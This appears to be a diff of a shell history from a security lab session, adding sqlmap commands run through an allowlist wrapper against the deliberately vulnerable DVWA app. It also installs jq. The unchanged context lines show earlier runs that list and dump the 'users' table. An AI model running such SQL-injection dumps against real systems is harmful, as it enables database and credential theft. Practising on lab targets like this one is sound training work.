@@ -18,3 +18,12 @@ jq '.sqlmap.allowed_flags' /root/scripts/allowlist.json
 /root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   -T users   --columns
 /root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   -T users   --dump
 exit
+jq '.sqlmap.allowed_flags' /root/scripts/allowlist.json
+/root/scripts/run_allowed.sh sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"
+apt-get jq
+apt update
+apt install -y jq
+/root/scripts/run_allowed.sh sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"
+clear
+/root/scripts/run_allowed.sh sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"
+exit
